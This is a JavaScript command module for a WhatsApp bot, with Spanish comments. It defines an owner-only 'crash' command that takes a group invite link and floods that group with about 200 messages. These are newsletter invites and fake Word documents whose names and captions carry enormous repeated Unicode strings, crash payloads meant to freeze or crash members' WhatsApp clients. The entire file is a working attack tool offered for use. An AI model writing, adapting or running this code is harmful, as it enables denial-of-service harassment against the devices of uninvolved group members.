export default {
  command: ['crash'],
  category: 'owner',
  run: async (client, m, { text, isOwner, usedPrefix, command }) => {
    // Verificación de propietario
    if (!isOwner) {
      return m.reply('Solo el propietario puede usar este comando.')
    }

    // Verificación de enlace
    if (!text || !text.includes('whatsapp.com')) {
      return client.sendMessage(m.chat, { 
        text: `😿 Debes proporcionar el enlace del grupo.\nEjemplo: *${usedPrefix}${command}* https://chat.whatsapp.com/XXXX` 
      }, { quoted: m })
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i)
    if (!match) return client.sendMessage(m.chat, { text: '😡 Enlace inválido.' }, { quoted: m })

    const inviteCode = match[1]
    let groupId

    try {
      const res = await client.groupGetInviteInfo(inviteCode)
      groupId = res.id
    } catch (e) {
      return client.sendMessage(m.chat, { 
        text: "⚠️ No se pudo obtener el ID del grupo. Verifica que el enlace sea válido." 
      }, { quoted: m })
    }

    // --- FUNCIONES INTERNAS DE ATAQUE ---

    const canalKillGrupo = async () => {
      const basura = 'ꦾ'.repeat(90000)
      await client.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363229729656123@newsletter",
          newsletterName: "ADOi" + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gALAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: "El mDKDNND",
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
        }
      }, {})
    }

    const docKillGrupo = async (i) => {
      const traba = 'ꦾ'.repeat(90000)
      const contenido = '\u200E'.repeat(5000) + i
      await client.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `ado 🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3)
      })
    }

    const canalGato = async () => {
      const basura = '𑇂𑆵𑆴𑆿'.repeat(75000)
      await client.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363229729656123@newsletter",
          newsletterName: "🔥👾🔥👾" + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gALAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: "El mejor bot",
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
        }
      }, {})
    }

    const docGato = async (i) => {
      const traba = '𑇂𑆵𑆴𑆿'.repeat(30000)
      const contenido = '\u200E'.repeat(5000) + i
      await client.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `🔥 ado  🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3)
      })
    }

    // --- INICIO DEL CICLO ---

    m.reply(`✅ Iniciando ataque al grupo: ${groupId}`)

    const delayMs = 9000
    const total = 200
    const ciclos = Math.floor(total / 4)

    for (let i = 0; i < ciclos; i++) {
      await canalKillGrupo()
      await new Promise(r => setTimeout(r, delayMs))

      await docKillGrupo(i)
      await new Promise(r => setTimeout(r, delayMs))

      await canalGato()
      await new Promise(r => setTimeout(r, delayMs))

      await docGato(i)
      await new Promise(r => setTimeout(r, delayMs))
    }

    const restantes = total % 4
    const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato]
    for (let i = 0; i < restantes; i++) {
      await extra[i](i)
      await new Promise(r => setTimeout(r, delayMs))
    }

    await client.sendMessage(m.chat, { 
      text: `✅ Proceso finalizado en el grupo ${groupId}.` 
    }, { quoted: m })
  },
}
